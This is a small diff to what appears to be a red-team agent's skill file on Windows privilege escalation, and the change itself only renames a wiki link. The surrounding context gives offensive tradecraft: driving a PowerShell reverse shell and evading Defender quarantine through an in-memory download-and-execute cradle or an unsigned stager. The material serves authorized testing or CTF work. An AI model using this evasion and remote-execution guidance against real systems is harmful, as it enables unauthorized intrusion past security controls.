@@ -12,7 +12,7 @@ description: Local Windows privesc to SYSTEM on a standalone/workgroup host (or 
 ## Wiki
 
 Hub: [[red-team-moc]] · Primary page: [[windows-privesc]] · Arsenal: [[privesc-exploit-arsenal]]
-Anchors: [[windows-enumeration]], [[netexec]], [[network-services]]
+Anchors: [[windows-enumeration]], [[netexec]], [[network-service-attacks]]
 **REFS:** [[windows-privesc]], [[privesc-exploit-arsenal]]
 Recompiled-LPE shortcut (CTF, standard-user session): Skill(nightmare)
 
@@ -53,7 +53,7 @@ Local-to-SYSTEM levers: token privileges, service misconfig, autologon creds, sc
 
 ## Exec channel (read this before driving a shell)
 
-Windows footholds are usually RDP or a reverse shell, rarely WinRM (unless the user is in Remote Management Users). Drive a PowerShell reverse shell with `bash scripts/win-rsh.sh <eng> '<one command>'` and follow `docs/shell-interaction.md`: ONE command per call, NO injected markers, type `$env:`/`$_` plainly (it escapes for the bridge). RDP-only, non-admin, non-WinRM user -> headless xfreerdp + an in-memory PS cradle (see [[network-services]]). **Defender is often live:** a dropped `RunasCs.exe`/`winPEASx64.exe` gets quarantined - deliver in-memory (`IEX(New-Object Net.WebClient).DownloadString(...)`), or a freshly-compiled (unsigned-but-unknown) stager, or a Microsoft-signed tool (`accesschk`). Solve evasion once at the loader ([[windows-privesc]]).
+Windows footholds are usually RDP or a reverse shell, rarely WinRM (unless the user is in Remote Management Users). Drive a PowerShell reverse shell with `bash scripts/win-rsh.sh <eng> '<one command>'` and follow `docs/shell-interaction.md`: ONE command per call, NO injected markers, type `$env:`/`$_` plainly (it escapes for the bridge). RDP-only, non-admin, non-WinRM user -> headless xfreerdp + an in-memory PS cradle (see [[network-service-attacks]]). **Defender is often live:** a dropped `RunasCs.exe`/`winPEASx64.exe` gets quarantined - deliver in-memory (`IEX(New-Object Net.WebClient).DownloadString(...)`), or a freshly-compiled (unsigned-but-unknown) stager, or a Microsoft-signed tool (`accesschk`). Solve evasion once at the loader ([[windows-privesc]]).
 
 ## Methodology
 
